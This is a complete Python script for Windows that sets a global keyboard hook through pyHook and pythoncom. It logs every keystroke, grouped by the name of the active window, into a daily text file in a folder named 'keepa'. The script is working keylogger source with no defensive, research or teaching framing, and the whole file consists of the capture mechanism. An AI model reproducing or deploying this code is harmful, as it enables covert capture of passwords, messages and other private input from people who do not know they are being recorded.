import time
import sys
import logging
from datetime import datetime

import pyHook
import pythoncom


ENTER_KEY = 13
TAB_KEY = 9
BACKSPACE_KEY = 8

# Make a new log for each day
todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'C:\\Users\\<user>\\keepa\\logs\\{0}.txt'.format(todays_date)

current_window = ''
line_buffer = ''

def on_keyboard_event(event):
    """
    Logs the character from the key pressed into a text file.
    """
    global current_window
    global line_buffer

    if current_window != event.WindowName:
        if line_buffer:
            line_buffer += '\n'
            _write_to_file(line_buffer)

        line_buffer = ''
        _write_to_file('\n[{0}]\n'.format(event.WindowName))
        current_window = event.WindowName

    # When ENTER or TAB is pressed, log the buffer
    if event.Ascii == ENTER_KEY or event.Ascii == TAB_KEY:
        line_buffer += '\n'
        _write_to_file(line_buffer)
        line_buffer = ''
        return True

    # When BACKSPACE is pressed, remove from the buffer
    if event.Ascii == BACKSPACE_KEY:
        line_buffer = line_buffer[:-1]
        return True

    # If not an invalid ASCII character
    if not (event.Ascii < 32 or event.Ascii > 126):
        # Add each character as its corresponding ASCII format to the buffer
        if event.Ascii:
            line_buffer += chr(event.Ascii)

    return True


def _write_to_file(line):
    with open(file_name, 'a') as f:
        f.write(line)


# The pyHook manager allows us to set a hook on Windows events
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_keyboard_event
hooks_manager.HookKeyboard()

# Pythoncom module captures the key messages
# Keeps the program running
pythoncom.PumpMessages()
